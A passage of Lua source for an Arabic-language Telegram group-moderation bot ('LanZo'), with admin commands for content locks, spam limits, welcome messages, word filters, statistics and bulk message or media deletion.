ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الكفر")  
DevaMeR:del(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevaMeR:get(LanZo..'aMeR:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفارسيه بالطرد")  
DevaMeR:set(LanZo..'aMeR:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالحذف")  
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالطرد")  
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالتقيد")  
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالطرد")  
end
if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevaMeR:set(LanZo.."aMeR:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevaMeR:set(LanZo..'aMeR:Lock:Pin'..msg.chat_id_,true)
DevaMeR:sadd(LanZo.."aMeR:Lock:Pinpin",msg.chat_id_) 
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source LanZo     --
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
--     Source LanZo     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Id:Photo'..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الايدي بالصوره'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:Id:Photo'..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Id'..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد مفعل ', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الايدي بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:Id'..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source LanZo     --
if text == 'ضع رابط' and ChCheck(msg) or text == 'وضع رابط' and ChCheck(msg) or text == 'ضع الرابط' and ChCheck(msg) or text == 'وضع الرابط' and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevaMeR:setex(LanZo.."aMeR:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevaMeR:get(LanZo.."aMeR:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevaMeR:set(LanZo.."aMeR:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevaMeR:setex(LanZo.."aMeR:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
--     Source LanZo     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الترحيب بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:Welcome"..msg.chat_id_)
end
if DevaMeR:get(LanZo..'aMeR:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevaMeR:del(LanZo..'aMeR:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevaMeR:del(LanZo..'aMeR:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevaMeR:set(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي الترحيب الان\n᥀︙تستطيع اضافة مايلي ↫ ⤈\n᥀︙دالة عرض الاسم ↫ firstname\n᥀︙دالة عرض المعرف ↫ username', 1, 'md')
DevaMeR:set(LanZo..'aMeR:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevaMeR:del(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_aMeR(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لم يتم وضع الترحيب \n᥀︙ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     Source LanZo     --
if DevaMeR:get(LanZo..'aMeR:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevaMeR:del(LanZo..'aMeR:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevaMeR:del(LanZo..'aMeR:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevaMeR:set(LanZo..'aMeR:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي الوصف الان', 1, 'md')
end
--     Source LanZo     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevaMeR:set(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevaMeR:get(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevaMeR:del(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevaMeR:del(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevaMeR:hset(LanZo..'aMeR:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevaMeR:set(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevaMeR:get(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevaMeR:del(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevaMeR:hget(LanZo..'aMeR:Filters:'..msg.chat_id_, text) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevaMeR:del(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevaMeR:hdel(LanZo..'aMeR:Filters:'..msg.chat_id_, text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevaMeR:del(LanZo.."aMeR:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source LanZo     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫  الاحصائيات ᥀" and ChCheck(msg) then
local gps = DevaMeR:scard(LanZo.."aMeR:Groups") local users = DevaMeR:scard(LanZo.."aMeR:Users") 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙احصائيات البوت ↫ ⤈\n᥀︙عدد المشتركين ↫ ❨ '..users..' ❩\n᥀︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ᥀" and ChCheck(msg) then
local users = DevaMeR:scard(LanZo.."aMeR:Users")
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ᥀" and ChCheck(msg) then
local gps = DevaMeR:scard(LanZo.."aMeR:Groups")
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
end
--     Source LanZo     --
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ᥀" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطورين فقط ', 1, 'md')
else
local list = DevaMeR:smembers(LanZo.."aMeR:Groups")
local t = '᥀︙مجموعات البوت ↫ ⤈ \n'
for k,v in pairs(list) do
t = t..k.."~ : `"..v.."`\n" 
end
if #list == 0 then
t = '᥀︙لا يوجد مجموعات مفعله'
end
Dev_aMeR(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     Source LanZo     --
if text and text:match('^تنظيف (%d+)$') or text and text:match('^مسح (%d+)$') and ChCheck(msg) then  
if not DevaMeR:get(LanZo..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$') or text:match('^مسح (%d+)$')) 
if Number > 5000 then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لاتستطيع تنظيف اكثر من 5000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevaMeR:setex(LanZo..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) or text == "↫ تنظيف المشتركين ᥀" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevaMeR:smembers(LanZo.."aMeR:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevaMeR:srem(LanZo.."aMeR:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عدد المشتركين الان ↫ { '..#pv..' }\n᥀︙تم حذف ↫ { '..sendok..' } من المشتركين\n᥀︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source LanZo     --
if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) or text == "↫ تنظيف المجموعات ᥀" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevaMeR:smembers(LanZo.."aMeR:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevaMeR:srem(LanZo.."aMeR:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = LanZo, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevaMeR:srem(LanZo.."aMeR:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevaMeR:srem(LanZo.."aMeR:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevaMeR:srem(LanZo.."aMeR:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local LanZogp2 = (w + q)
local LanZogp3 = #group - LanZogp2
if q == 0 then
LanZogp2 = ''
else
LanZogp2 = '\n᥀︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
LanZogp1 = ''
else
LanZogp1 = '\n᥀︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙عدد الكروبات الان ↫ { '..#group..' }'..LanZogp1..LanZogp2..'\n᥀︙العدد الحقيقي الان  ↫ ( '..LanZogp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source LanZo     --
if text and (text == "تفعيل التلقائي" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل ميزة الحذف التلقائي للميديا'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:CleanNum'..msg.chat_id_,true)  
end
if text and (text == "تعطيل التلقائي" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الحذف التلقائي للميديا'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:CleanNum'..msg.chat_id_) 
end
if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$") or text:match("^عدد المسح (%d+)$")) and Constructor(msg) and ChCheck(msg) then
local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$") or text:match("عدد المسح (%d+)$")
if tonumber(Num) < 10 or tonumber(Num) > 1000 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بتحديد عدد اكبر من 10 واصغر من 1000 للحذف التلقائي', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevaMeR:set(LanZo..'aMeR:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevaMeR:get(LanZo..'aMeR:Lock:CleanNum'..msg.chat_id_) then
if DevaMeR:get(LanZo..'aMeR:CleanNum'..msg.chat_id_) then CleanNum = DevaMeR:get(LanZo..'aMeR:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevaMeR:scard(LanZo.."aMeR:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevaMeR:smembers(LanZo.."aMeR:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"᥀︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
DevaMeR:del(LanZo.."aMeR:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevaMeR:scard(LanZo.."aMeR:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevaMeR:get(LanZo..'aMeR:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end
end
end
--     Source LanZo     --
if text == "تفعيل امسح" and Constructor(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevaMeR:scard(LanZo.."aMeR:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M, 1, 'md') 
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
local List = DevaMeR:smembers(LanZo.."aMeR:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevaMeR:del(LanZo.."aMeR:cleaner"..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     Source LanZo     --
if text == "تفعيل مسح الاغاني" and Constructor(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل مسح الاغاني بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevaMeR:scard(LanZo.."aMeR:cleanermusic"..msg.chat_id_)
if M ~= 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عدد الاغاني ↫ "..M, 1, 'md') 
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end
if text == "مسح الاغاني" or text == "تنظيف الاغاني" or text == "حذف الاغاني" then
local List = DevaMeR:smembers(LanZo.."aMeR:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف "..Del.." من الاغاني", 1, 'md') 
DevaMeR:del(LanZo.."aMeR:cleanermusic"..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source LanZo     --
if Admin(msg) then
if text == "تنظيف تعديل" and ChCheck(msg) or text == "تنظيف التعديل" and ChCheck(msg) then   
aMeR_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
aMeR_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = aMeR_Del},function(arg,data)
new = 0
aMeR_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
aMeR_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,aMeR_Del2)
end,nil)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source LanZo     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "التعديل" then
if DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevaMeR:del(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
